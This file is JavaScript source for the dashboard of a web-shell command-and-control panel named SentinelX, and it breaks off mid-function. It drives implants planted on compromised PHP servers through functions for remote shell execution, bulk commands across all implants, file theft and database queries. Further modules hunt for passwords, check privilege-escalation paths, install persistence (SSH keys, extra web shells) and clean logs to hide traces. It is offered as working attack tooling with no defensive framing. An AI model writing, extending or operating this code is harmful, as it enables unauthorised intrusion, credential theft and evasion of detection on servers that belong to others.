let currentImplant = null;
let implants = [];
let autoRefreshInterval = null;
let previousStatuses = {};
let autoRefreshEnabled = false;

function $(id) { return document.getElementById(id); }

function api(action, data, callback) {
    const form = new FormData();
    Object.entries(data||{}).forEach(([k,v]) => form.append(k, v));
    fetch('?action=' + action, { method: 'POST', body: form })
        .then(r => r.json())
        .then(d => { if (callback) callback(d); })
        .catch(e => { if (callback) callback({ status: 'error', message: e.message }); });
}

// ========== TOAST NOTIFICATIONS ==========

function showToast(message, type, duration) {
    type = type || 'info';
    duration = duration || 4000;
    const container = $('toastContainer');
    const toast = document.createElement('div');
    toast.className = 'toast toast-' + type;
    toast.textContent = message;
    container.appendChild(toast);
    requestAnimationFrame(() => toast.classList.add('show'));
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

function notifyStatusChange(id, oldStatus, newStatus) {
    const imp = getImplant(id);
    if (!imp) return;
    if (oldStatus === 'unknown' || !oldStatus) return;
    if (oldStatus === newStatus) return;
    if (newStatus === 'online') {
        showToast(imp.name + ' is now online', 'success');
    } else if (newStatus === 'offline') {
        showToast(imp.name + ' went offline', 'danger');
    } else if (newStatus === 'error') {
        showToast(imp.name + ' returned an error', 'warning');
    }
}

// ========== IMPLANT LIST ==========

function refreshList() {
    const list = $('implantList');
    list.innerHTML = '';
    const keys = Object.keys(localStorage).filter(k => k.startsWith('implant_'));
    if (keys.length === 0) {
        list.innerHTML = '<div class="loading">No implants. Add one to begin.</div>';
        return;
    }
    implants = [];
    keys.forEach(k => {
        const imp = JSON.parse(localStorage.getItem(k));
        implants.push(imp);
        const div = document.createElement('div');
        div.className = 'implant-card' + (imp.status === 'online' ? ' online' : '');
        div.dataset.id = imp.id;
        const statusClass = imp.status || 'unknown';
        div.innerHTML = `
            <div class="imp-name">${esc(imp.name)}</div>
            <div class="imp-url">${esc(imp.url)}</div>
            <div class="imp-meta">
                <span class="imp-status ${statusClass}">
                    <span class="dot"></span> ${statusClass}
                </span>
                ${imp.last_seen ? '<span class="imp-last">' + imp.last_seen + '</span>' : ''}
                ${imp.info && imp.info.hostname ? '<span>' + esc(imp.info.hostname) + '</span>' : ''}
            </div>
        `;
        div.onclick = () => selectImplant(imp.id);
        list.appendChild(div);
    });
    updateStats();
}

function selectImplant(id) {
    currentImplant = id;
    document.querySelectorAll('.implant-card').forEach(c => c.classList.remove('active'));
    const card = document.querySelector(`.implant-card[data-id="${id}"]`);
    if (card) card.classList.add('active');
    const imp = getImplant(id);
    if (!imp) return;

    const view = $('viewContent');
    view.innerHTML = `
        <div class="implant-detail">
            <div class="implant-detail-header">
                <h2>${esc(imp.name)}</h2>
                <div class="implant-actions">
                    <button class="btn" onclick="beacon('${id}')">Beacon</button>
                    <button class="btn" onclick="openShell('${id}')">Shell</button>
                    <button class="btn" onclick="openFileManager('${id}')">Files</button>
                    <button class="btn" onclick="openDbBrowser('${id}')">DB</button>
                    <button class="btn" onclick="showProcs('${id}')">Procs</button>
                    <button class="btn" onclick="showNetstat('${id}')">Netstat</button>
                    <button class="btn btn-danger" onclick="selfDestruct('${id}')">Destroy</button>
                </div>
            </div>
            <div class="info-grid">
                <div class="info-item"><label>URL</label><span>${esc(imp.url)}</span></div>
                <div class="info-item"><label>Status</label><span class="imp-status ${imp.status||'unknown'}"><span class="dot"></span> ${imp.status||'unknown'}</span></div>
                <div class="info-item"><label>Last Seen</label><span>${imp.last_seen || 'Never'}</span></div>
                <div class="info-item"><label>Added</label><span>${imp.added || 'N/A'}</span></div>
                <div class="info-item"><label>Notes</label><span>${esc(imp.notes||'-')}</span></div>
            </div>
            ${imp.info ? `
            <div class="section-title">System Information</div>
            <div class="info-grid">
                <div class="info-item"><label>Hostname</label><span>${esc(imp.info.hostname||'N/A')}</span></div>
                <div class="info-item"><label>OS</label><span>${esc(imp.info.os||'N/A')}</span></div>
                <div class="info-item"><label>PHP</label><span>${esc(imp.info.php_version||'N/A')}</span></div>
                <div class="info-item"><label>Server</label><span>${esc(imp.info.server||'N/A')}</span></div>
                <div class="info-item"><label>User</label><span>${esc(imp.info.user||'N/A')}</span></div>
                <div class="info-item"><label>UID</label><span>${esc(imp.info.uid||'N/A')}</span></div>
                <div class="info-item"><label>CWD</label><span>${esc(imp.info.cwd||'N/A')}</span></div>
                <div class="info-item"><label>Exec Available</label><span>${imp.info.exec_available ? 'Yes' : 'No'}</span></div>
                <div class="info-item"><label>Writable</label><span>${imp.info.write_check ? 'Yes' : 'No'}</span></div>
                <div class="info-item"><label>Server IP</label><span>${esc(imp.info.server_ip||'N/A')}</span></div>
                <div class="info-item"><label>Disk Free</label><span>${imp.info.disk_free ? formatSize(imp.info.disk_free) : 'N/A'}</span></div>
            </div>
            <div class="section-title">Modules</div>
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px;">
                <button class="btn btn-sm" onclick="showPasswordHunt('${id}')">Password Hunt</button>
                <button class="btn btn-sm" onclick="showPrivesc('${id}')">Privesc Check</button>
                <button class="btn btn-sm" onclick="showPersistence('${id}')">Persistence</button>
                <button class="btn btn-sm" onclick="showScreenshot('${id}')">Screenshot</button>
                <button class="btn btn-sm" onclick="showLogClean('${id}')">Log Cleaner</button>
                <button class="btn btn-sm" onclick="showFileSearch('${id}')">File Search</button>
                <button class="btn btn-sm" onclick="showWebReq('${id}')">Web Request</button>
            </div>
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;">
                <button class="btn btn-sm" onclick="showRegistry('${id}')">Registry</button>
                <button class="btn btn-sm" onclick="showWmi('${id}')">WMI</button>
                <button class="btn btn-sm" onclick="showSchtasks('${id}')">SchTasks</button>
                <button class="btn btn-sm" onclick="showDefender('${id}')">Defender</button>
                <button class="btn btn-sm" onclick="showDbSchema('${id}')">DB Schema</button>
                <button class="btn btn-sm" onclick="showAutoUpdate('${id}')">Auto-Update</button>
                <button class="btn btn-sm" onclick="showAtSchedule('${id}')">at/cron</button>
                <button class="btn btn-sm" onclick="showSweep('${id}')">Sweep</button>
                <button class="btn btn-sm" onclick="showChunkedDownload('${id}')">Chunk DL</button>
            </div>` : ''}
            <button class="btn btn-danger" style="margin-top:8px;" onclick="removeImplant('${id}')">Remove Implant</button>
        </div>
    `;
}

function getImplant(id) {
    const raw = localStorage.getItem('implant_' + id);
    return raw ? JSON.parse(raw) : null;
}

function updateImplant(id, updates) {
    const imp = getImplant(id);
    if (!imp) return;
    const oldStatus = imp.status;
    Object.assign(imp, updates);
    localStorage.setItem('implant_' + id, JSON.stringify(imp));
    if (updates.status && updates.status !== oldStatus) {
        notifyStatusChange(id, oldStatus, updates.status);
    }
}

function esc(s) {
    const d = document.createElement('div');
    d.textContent = s || '';
    return d.innerHTML;
}

function updateStats() {
    const total = implants.length;
    const online = implants.filter(i => i.status === 'online').length;
    const offline = implants.filter(i => i.status === 'offline').length;
    const unknown = implants.filter(i => i.status === 'unknown' || !i.status).length;
    const stats = $('statsRow');
    if (stats) {
        stats.innerHTML = `
            <div class="stat-card">
                <div class="stat-icon purple">T</div>
                <div class="stat-value" style="color:var(--accent)">${total}</div>
                <div class="stat-label">Total Implants</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon green">O</div>
                <div class="stat-value" style="color:var(--success)">${online}</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon red">F</div>
                <div class="stat-value" style="color:var(--danger)">${offline}</div>
                <div class="stat-label">Offline</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon cyan">U</div>
                <div class="stat-value">${unknown}</div>
                <div class="stat-label">Unknown</div>
            </div>
        `;
    }
}

// ========== IMPLANT MANAGEMENT ==========

function showAddImplant() { $('addModal').style.display = 'flex'; }
function closeModal(id) { $(id).style.display = 'none'; }

function addImplant(e) {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));
    const id = 'sx' + Date.now().toString(36) + Math.random().toString(36).slice(2,5);
    const implant = {
        id, name: data.name, url: data.url.replace(/\/+$/, ''),
        auth_key: data.auth_key || 'sentinelx_2024',
        added: new Date().toLocaleString(),
        last_seen: null, status: 'unknown', notes: data.notes,
        info: null,
    };
    localStorage.setItem('implant_' + id, JSON.stringify(implant));
    closeModal('addModal');
    refreshList();
    showToast('Implant ' + implant.name + ' added', 'success');
    beacon(id);
}

function removeImplant(id) {
    if (!confirm('Remove this implant?')) return;
    const imp = getImplant(id);
    localStorage.removeItem('implant_' + id);
    delete previousStatuses[id];
    currentImplant = null;
    refreshList();
    $('viewContent').innerHTML = `<div class="welcome"><h1>SentinelX Dashboard</h1><p>Select an implant from the sidebar to begin.</p><div class="stats-row" id="statsRow"></div></div>`;
    updateStats();
    if (imp) showToast('Implant ' + imp.name + ' removed', 'warning');
}

function beacon(id) {
    const imp = getImplant(id);
    if (!imp) return;
    const oldStatus = imp.status;
    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: 'action=beacon'
    })
    .then(r => r.json())
    .then(d => {
        if (d.status === 'ok') {
            updateImplant(id, { last_seen: new Date().toLocaleString(), status: 'online', info: d.data });
        } else {
            updateImplant(id, { status: 'error' });
        }
        refreshList();
        if (currentImplant === id) selectImplant(id);
    })
    .catch(() => {
        updateImplant(id, { status: 'offline' });
        refreshList();
    });
}

function beaconAll() {
    let count = 0;
    const total = implants.length;
    implants.forEach((i, idx) => {
        setTimeout(() => {
            beacon(i.id);
            count++;
            if (count === total) {
                $('connStatus').className = 'status-dot online';
                setTimeout(() => { $('connStatus').className = 'status-dot'; }, 2000);
            }
        }, idx * 150);
    });
    showToast('Beaconing ' + total + ' implants...', 'info', 2000);
}

// ========== AUTO-REFRESH ==========

function toggleAutoRefresh() {
    const toggle = $('autoRefreshToggle');
    autoRefreshEnabled = toggle.checked;
    if (autoRefreshEnabled) {
        const interval = 15000;
        autoRefreshInterval = setInterval(() => {
            const online = implants.filter(i => i.status === 'online');
            online.forEach(i => beacon(i.id));
        }, interval);
        showToast('Auto-refresh enabled (every 15s)', 'info', 2000);
        beaconAll();
    } else {
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
            autoRefreshInterval = null;
        }
        showToast('Auto-refresh disabled', 'info', 2000);
    }
}

// ========== THEME TOGGLE ==========

function toggleTheme() {
    const root = document.documentElement;
    const btn = $('themeBtn');
    const isLight = root.classList.toggle('light-theme');
    btn.textContent = isLight ? 'Dark' : 'Light';
    localStorage.setItem('sx_theme', isLight ? 'light' : 'dark');
}

function initTheme() {
    const saved = localStorage.getItem('sx_theme');
    if (saved === 'light') {
        document.documentElement.classList.add('light-theme');
        if ($('themeBtn')) $('themeBtn').textContent = 'Dark';
    }
}

// ========== SHELL ==========

function openShell(id) {
    $('shellId').value = id;
    $('shellTitle').textContent = 'Shell - ' + (getImplant(id)?.name || id);
    $('shellOutput').innerHTML = '';
    $('shellCmd').value = '';
    $('shellCwd').textContent = '$';
    $('shellModal').style.display = 'flex';
    $('shellCmd').focus();
}

function execCommand(e) {
    e.preventDefault();
    const id = $('shellId').value;
    const cmd = $('shellCmd').value;
    if (!cmd) return;
    const out = $('shellOutput');
    out.innerHTML += `<span class="prompt">$ ${esc(cmd)}</span>\n`;
    $('shellCmd').value = '';
    $('shellCmd').disabled = true;

    const imp = getImplant(id);
    if (!imp) { out.innerHTML += '<span class="error">Implant not found</span>\n'; $('shellCmd').disabled = false; $('shellCmd').focus(); return; }

    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: 'action=exec&cmd=' + encodeURIComponent(cmd)
    })
    .then(r => r.json())
    .then(d => {
        if (d.status === 'ok') {
            out.innerHTML += esc(d.output || '(no output)') + '\n';
            if (d.cwd) $('shellCwd').textContent = esc(d.cwd);
            updateImplant(id, { last_seen: new Date().toLocaleString(), status: 'online' });
        } else {
            out.innerHTML += '<span class="error">' + esc(d.message || 'Error') + '</span>\n';
        }
        out.scrollTop = out.scrollHeight;
        $('shellCmd').disabled = false;
        $('shellCmd').focus();
    })
    .catch(e => {
        out.innerHTML += '<span class="error">Connection error: ' + esc(e.message) + '</span>\n';
        updateImplant(id, { status: 'offline' });
        $('shellCmd').disabled = false;
    });
    refreshList();
}

// ========== FILE MANAGER ==========

let currentFilePath = '/';

function openFileManager(id) {
    $('fileId').value = id;
    $('fileCurrentPath').value = '/';
    $('fileUpload').onchange = function() { uploadFile(id); };
    currentFilePath = '/';
    $('fileModal').style.display = 'flex';
    loadFileList(id, '/');
}

function refreshFileList() {
    const id = $('fileId').value;
    const path = $('fileCurrentPath').value || '/';
    loadFileList(id, path);
}

function loadFileList(id, path) {
    const imp = getImplant(id);
    if (!imp) return;
    $('filePath').textContent = 'Loading ' + path + '...';
    currentFilePath = path;
    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: 'action=file&faction=list&path=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(d => {
        const list = $('fileList');
        if (d.status !== 'ok') { list.innerHTML = '<div class="loading">Error: ' + esc(d.message) + '</div>'; return; }
        $('filePath').textContent = d.path || path;
        $('fileCurrentPath').value = d.path || path;
        updateImplant(id, { last_seen: new Date().toLocaleString(), status: 'online' });

        list.innerHTML = '';
        if (path !== '/') {
            const parent = path.split('/').slice(0,-1).join('/') || '/';
            const div = document.createElement('div');
            div.className = 'file-item dir';
            div.innerHTML = '<span class="fname">..</span>';
            div.onclick = () => loadFileList(id, parent);
            list.appendChild(div);
        }
        (d.items || []).forEach(item => {
            const div = document.createElement('div');
            div.className = 'file-item ' + item.type;
            const fullPath = (d.path||path) + '/' + item.name;
            div.innerHTML = `<span class="fname">${esc(item.name)}</span><span class="fsize">${item.type==='dir'?'-':formatSize(item.size)}</span><span class="fperms">${item.perms||''}</span><span class="fmtime">${item.modified||''}</span>`;
            if (item.type === 'dir') {
                div.onclick = () => loadFileList(id, fullPath);
            } else {
                div.ondblclick = () => viewFile(id, fullPath);
                const dlBtn = document.createElement('span');
                dlBtn.className = 'file-dl';
                dlBtn.textContent = '[DL]';
                dlBtn.onclick = (e) => { e.stopPropagation(); downloadFile(id, fullPath); };
                div.appendChild(dlBtn);
            }
            list.appendChild(div);
        });
        refreshList();
    })
    .catch(e => {
        $('fileList').innerHTML = '<div class="loading">Connection error</div>';
        updateImplant(id, { status: 'offline' });
    });
}

function viewFile(id, path) {
    const imp = getImplant(id);
    if (!imp) return;
    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: 'action=file&faction=read&path=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(d => {
        if (d.status !== 'ok') return;
        const content = d.content || '';
        const view = $('viewContent');
        view.innerHTML = `
            <div class="implant-detail-header">
                <h2 style="font-size:14px;">${esc(path)}</h2>
                <div class="implant-actions">
                    <button class="btn" onclick="openFileManager('${id}')">Back</button>
                    <button class="btn" onclick="downloadFile('${id}','${esc(path)}')">Download</button>
                </div>
            </div>
            <pre class="file-viewer">${esc(content)}</pre>
        `;
    });
}

function uploadFile(id) {
    const fileInput = $('#fileUpload');
    if (!fileInput.files.length) return;
    const file = fileInput.files[0];
    const path = $('fileCurrentPath').value || '/';
    const form = new FormData();
    form.append('action', 'upload');
    form.append('id', id);
    form.append('path', path);
    form.append('file', file);

    showToast('Uploading ' + file.name + '...', 'info', 3000);
    fetch('?action=upload', { method: 'POST', body: form })
        .then(r => r.json())
        .then(d => {
            if (d.status === 'ok') {
                showToast(file.name + ' uploaded successfully', 'success');
                loadFileList(id, $('fileCurrentPath').value || '/');
            } else {
                showToast('Upload failed: ' + (d.message || 'Unknown error'), 'danger');
            }
        })
        .catch(e => showToast('Upload error: ' + e.message, 'danger'));
    fileInput.value = '';
}

function downloadFile(id, path) {
    const imp = getImplant(id);
    if (!imp) return;
    showToast('Downloading ' + basename(path) + '...', 'info', 3000);
    window.open('?action=download&id=' + encodeURIComponent(id) + '&path=' + encodeURIComponent(path), '_blank');
}

function basename(p) { return p.split('/').filter(Boolean).pop() || p; }

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '-';
    const units = ['B','KB','MB','GB'];
    let i = 0;
    while (bytes >= 1024 && i < units.length-1) { bytes /= 1024; i++; }
    return bytes.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}

// ========== DATABASE ==========

function openDbBrowser(id) {
    $('dbId').value = id;
    $('dbResult').innerHTML = '';
    $('dbModal').style.display = 'flex';
}

function execDbQuery(e) {
    e.preventDefault();
    const id = $('dbId').value;
    const form = new FormData(e.target);
    form.append('action', 'db');
    form.append('id', id);

    const imp = getImplant(id);
    if (!imp) return;
    $('dbResult').innerHTML = '<div class="loading">Executing...</div>';

    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: new URLSearchParams(form).toString()
    })
    .then(r => r.json())
    .then(d => {
        const div = $('dbResult');
        if (d.status !== 'ok') { div.innerHTML = '<span class="error">' + esc(d.message) + '</span>'; return; }
        if (d.affected !== undefined) { div.innerHTML = 'Query OK, ' + d.affected + ' rows affected.'; return; }
        if (!d.rows || d.rows.length === 0) { div.innerHTML = 'Query returned 0 rows.'; return; }
        let html = '<table><thead><tr>';
        Object.keys(d.rows[0]).forEach(k => html += '<th>' + esc(k) + '</th>');
        html += '</tr></thead><tbody>';
        d.rows.forEach(r => {
            html += '<tr>';
            Object.values(r).forEach(v => html += '<td>' + esc(String(v ?? 'NULL')) + '</td>');
            html += '</tr>';
        });
        html += '</tbody></table><div style="margin-top:8px;color:var(--text-dim);">' + d.count + ' row(s)</div>';
        div.innerHTML = html;
    })
    .catch(e => { $('dbResult').innerHTML = '<span class="error">' + esc(e.message) + '</span>'; });
}

// ========== BULK EXEC ==========

function openBulkExec() {
    $('bulkCmd').value = '';
    $('bulkResult').innerHTML = '';
    $('bulkStatus').style.display = 'none';
    $('bulkModal').style.display = 'flex';
    $('bulkCmd').focus();
}

function execBulk(e) {
    e.preventDefault();
    const cmd = $('bulkCmd').value;
    if (!cmd) return;
    const resultDiv = $('bulkResult');
    const status = $('bulkStatus');
    resultDiv.innerHTML = '';
    status.style.display = 'inline';
    status.textContent = 'Running on ' + implants.filter(i => i.status === 'online').length + ' online implants...';

    api('bulk_exec', { cmd }, function(d) {
        status.style.display = 'none';
        if (d.status !== 'ok' || !d.results) {
            resultDiv.innerHTML = '<span class="error">Bulk exec failed</span>';
            return;
        }
        let html = '<table><thead><tr><th>Implant</th><th>Status</th><th>Output</th></tr></thead><tbody>';
        d.results.forEach(r => {
            const cls = r.status === 'ok' ? 'success' : 'danger';
            html += `<tr><td>${esc(r.name)}</td><td><span class="status-text ${cls}">${esc(r.status)}</span></td><td class="bulk-output-cell"><pre>${esc(r.output || '(no output)')}</pre></td></tr>`;
        });
        html += '</tbody></table>';
        resultDiv.innerHTML = html;
        showToast('Bulk exec completed on ' + d.results.length + ' implants', 'success');
        refreshList();
    });
}

// ========== EXPORT LOGS ==========

function exportLogs() {
    showToast('Fetching logs...', 'info', 2000);
    api('export_log', {}, function(d) {
        if (d.status !== 'ok') {
            showToast('Failed to fetch logs', 'danger');
            return;
        }
        const content = d.content || 'No logs recorded yet.';
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'sentinelx_logs_' + new Date().toISOString().slice(0,10) + '.log';
        a.click();
        URL.revokeObjectURL(url);
        showToast('Logs exported', 'success');
    });
}

// ========== SELF DESTRUCT ==========

function selfDestruct(id) {
    if (!confirm('Self-destruct will DELETE the implant file from the target server. Continue?')) return;
    if (!confirm('Are you sure? This action cannot be undone.')) return;
    const imp = getImplant(id);
    if (!imp) return;
    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: 'action=self_destruct'
    })
    .then(r => r.json())
    .then(() => {
        localStorage.removeItem('implant_' + id);
        delete previousStatuses[id];
        refreshList();
        $('viewContent').innerHTML = `<div class="welcome"><h1>Implant Destroyed</h1><p>The remote file has been removed.</p></div>`;
        showToast('Implant ' + imp.name + ' destroyed', 'danger');
    });
}

// ========== MODULES ==========

function implantFetch(id, data, callback) {
    const imp = getImplant(id);
    if (!imp) { showToast('Implant not found', 'danger'); return; }
    const form = new URLSearchParams(data).toString();
    fetch(imp.url + '/implant.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Auth': imp.auth_key },
        body: form
    })
    .then(r => r.json())
    .then(d => {
        updateImplant(id, { last_seen: new Date().toLocaleString(), status: 'online' });
        if (callback) callback(d);
    })
    .catch(() => {
        updateImplant(id, { status: 'offline' });
        showToast('Connection failed', 'danger');
    });
}

// --- PROCESS LIST ---

function showProcs(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Loading processes...</div>';
    implantFetch(id, { action: 'proc_list' }, function(d) {
        if (d.status !== 'ok' || !d.processes) { view.innerHTML = '<div class="loading">Failed to get processes</div>'; return; }
        let html = '<div class="implant-detail-header"><h2>Process List</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div>';
        html += '<div class="module-toolbar"><span>' + d.processes.length + ' processes</span></div>';
        html += '<table class="module-table"><thead><tr><th>PID</th><th>Name</th><th>CPU</th><th>MEM</th><th>User</th><th>Command</th></tr></thead><tbody>';
        d.processes.forEach(p => {
            html += '<tr><td>' + esc(p.pid) + '</td><td>' + esc(p.name || '') + '</td><td>' + esc(p.cpu || '') + '</td><td>' + esc(p.mem || '') + '</td><td>' + esc(p.user || '') + '</td><td class="mono">' + esc((p.cmd || p.name || '').substring(0, 120)) + '</td></tr>';
        });
        html += '</tbody></table>';
        view.innerHTML = html;
    });
}

// --- NETSTAT ---

function showNetstat(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Loading connections...</div>';
    implantFetch(id, { action: 'netstat' }, function(d) {
        if (d.status !== 'ok') { view.innerHTML = '<div class="loading">Failed</div>'; return; }
        const conns = d.connections || [];
        let html = '<div class="implant-detail-header"><h2>Network Connections</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div>';
        html += '<div class="module-toolbar"><span>' + conns.length + ' connections</span></div>';
        html += '<table class="module-table"><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>State</th></tr></thead><tbody>';
        conns.forEach(c => {
            html += '<tr><td>' + esc(c.proto || '') + '</td><td class="mono">' + esc(c.local || '') + '</td><td class="mono">' + esc(c.remote || '') + '</td><td>' + esc(c.state || '') + '</td></tr>';
        });
        html += '</tbody></table>';
        view.innerHTML = html;
    });
}

// --- PASSWORD HUNT ---

function showPasswordHunt(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Scanning for credentials...</div>';
    implantFetch(id, { action: 'password_hunt' }, function(d) {
        if (d.status !== 'ok') { view.innerHTML = '<div class="loading">Failed</div>'; return; }
        let html = '<div class="implant-detail-header"><h2>Password Hunt</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div>';
        if (d.count === 0) {
            html += '<div class="loading">No passwords found in common locations</div>';
        } else {
            html += '<div class="module-toolbar"><span class="text-danger">' + d.count + ' potential passwords found</span></div>';
            html += '<table class="module-table"><thead><tr><th>File</th><th>Line</th><th>Match</th></tr></thead><tbody>';
            (d.hits || []).forEach(h => {
                html += '<tr><td class="mono">' + esc(h.file) + '</td><td>' + esc(h.line) + '</td><td class="mono text-warning">' + esc(h.match) + '</td></tr>';
            });
            html += '</tbody></table>';
        }
        if (d.candidates && d.candidates.length) {
            html += '<div class="section-title">Config Files Found (' + d.candidates.length + ')</div>';
            html += '<table class="module-table"><thead><tr><th>File</th><th>Size</th><th>Preview</th></tr></thead><tbody>';
            d.candidates.slice(0, 20).forEach(c => {
                html += '<tr><td class="mono">' + esc(c.file) + '</td><td>' + formatSize(c.size) + '</td><td class="mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">' + esc((c.content || '').substring(0, 200)) + '</td></tr>';
            });
            html += '</tbody></table>';
        }
        view.innerHTML = html;
    });
}

// --- PRIVESC CHECK ---

function showPrivesc(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Checking privilege escalation vectors...</div>';
    implantFetch(id, { action: 'privesc_check' }, function(d) {
        if (d.status !== 'ok' || !d.checks) { view.innerHTML = '<div class="loading">Failed</div>'; return; }
        let html = '<div class="implant-detail-header"><h2>Privilege Escalation Check</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div>';
        html += '<div class="module-toolbar">' + d.checks.length + ' checks performed</div>';
        html += '<div class="privesc-grid">';
        d.checks.forEach(c => {
            const riskClass = c.risk === 'critical' ? 'risk-critical' : c.risk === 'high' ? 'risk-high' : c.risk === 'medium' ? 'risk-medium' : 'risk-low';
            const result = Array.isArray(c.result) ? c.result.map(r => esc(r)).join('<br>') : esc(c.result);
            html += '<div class="privesc-card ' + riskClass + '"><div class="privesc-header"><span class="privesc-title">' + esc(c.check) + '</span><span class="privesc-risk">' + esc(c.risk) + '</span></div><div class="privesc-result mono">' + result + '</div></div>';
        });
        html += '</div>';
        view.innerHTML = html;
    });
}

// --- PERSISTENCE ---

function showPersistence(id) {
    $('persistId').value = id;
    $('persistResult').innerHTML = '';
    $('persistModal').style.display = 'flex';
}

function runPersistence(method) {
    const id = $('persistId').value;
    const resultDiv = $('persistResult');
    resultDiv.innerHTML = '<div class="loading">Installing ' + method + ' persistence...</div>';
    const data = { action: 'persistence', method: method };
    if (method === 'ssh_key') {
        data.ssh_key = prompt('Enter SSH public key to add:');
        if (!data.ssh_key) return;
    }
    if (method === 'webshell') {
        data.web_path = prompt('Path for web shell (e.g. /var/www/html/shell.php):');
        if (!data.web_path) return;
    }
    implantFetch(id, data, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">Failed</span>'; return; }
        let html = '<table class="module-table"><thead><tr><th>Method</th><th>Status</th><th>Detail</th></tr></thead><tbody>';
        (d.results || []).forEach(r => {
            const cls = r.status === 'installed' ? 'text-success' : 'text-danger';
            html += '<tr><td>' + esc(r.method) + '</td><td class="' + cls + '">' + esc(r.status) + '</td><td class="mono">' + esc(r.detail || '') + '</td></tr>';
        });
        html += '</tbody></table>';
        resultDiv.innerHTML = html;
    });
}

// --- SCREENSHOT ---

function showScreenshot(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Capturing screenshot...</div>';
    implantFetch(id, { action: 'screenshot' }, function(d) {
        if (d.status !== 'ok' || !d.image) {
            view.innerHTML = '<div class="implant-detail-header"><h2>Screenshot</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div><div class="loading">' + esc(d.message || 'No screenshot method available') + '</div>';
            return;
        }
        let html = '<div class="implant-detail-header"><h2>Screenshot</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button> <button class="btn" onclick="showScreenshot(\'' + id + '\')">Refresh</button></div>';
        html += '<div class="screenshot-container"><img src="data:image/' + esc(d.format || 'png') + ';base64,' + d.image + '" class="screenshot-img"></div>';
        view.innerHTML = html;
    });
}

// --- LOG CLEANER ---

function showLogClean(id) {
    const view = $('viewContent');
    view.innerHTML = '<div class="loading">Cleaning logs...</div>';
    implantFetch(id, { action: 'log_clean' }, function(d) {
        if (d.status !== 'ok') { view.innerHTML = '<div class="loading">Failed</div>'; return; }
        let html = '<div class="implant-detail-header"><h2>Log Cleaner</h2><button class="btn" onclick="selectImplant(\'' + id + '\')">Back</button></div>';
        html += '<div class="module-toolbar"><span class="text-success">Cleaned ' + (d.count || 0) + ' files</span></div>';
        html += '<table class="module-table"><thead><tr><th>File</th><th>Action</th><th>Size Before</th></tr></thead><tbody>';
        (d.cleaned || []).forEach(c => {
            html += '<tr><td class="mono">' + esc(c.file) + '</td><td>' + esc(c.action || '') + '</td><td>' + (c.size_before ? formatSize(c.size_before) : '-') + '</td></tr>';
        });
        html += '</tbody></table>';
        view.innerHTML = html;
    });
}

// --- FILE SEARCH ---

function showFileSearch(id) {
    $('searchId').value = id;
    $('searchResult').innerHTML = '';
    $('searchPattern').value = '*.env';
    $('searchPath').value = '/var/www';
    $('searchModal').style.display = 'flex';
}

function runFileSearch() {
    const id = $('searchId').value;
    const pattern = $('searchPattern').value;
    const path = $('searchPath').value;
    if (!pattern) { showToast('Enter a search pattern', 'warning'); return; }
    const resultDiv = $('searchResult');
    resultDiv.innerHTML = '<div class="loading">Searching for ' + esc(pattern) + '...</div>';
    implantFetch(id, { action: 'file', faction: 'search', path: path, data: JSON.stringify({ pattern: pattern, max: 200 }) }, function(d) {
        if (d.status !== 'ok' || !d.results) { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Search failed') + '</span>'; return; }
        if (d.count === 0) { resultDiv.innerHTML = '<div class="loading">No files matching "' + esc(pattern) + '"</div>'; return; }
        let html = '<div class="module-toolbar"><span>' + d.count + ' files found</span></div>';
        html += '<table class="module-table"><thead><tr><th>Name</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead><tbody>';
        d.results.forEach(r => {
            html += '<tr><td>' + esc(r.name) + '</td><td class="mono">' + esc(r.path) + '</td><td>' + formatSize(r.size) + '</td><td>' + esc(r.modified || '') + '</td></tr>';
        });
        html += '</tbody></table>';
        resultDiv.innerHTML = html;
    });
}

// --- WEB REQUEST ---

function showWebReq(id) {
    $('webreqId').value = id;
    $('webreqResult').innerHTML = '';
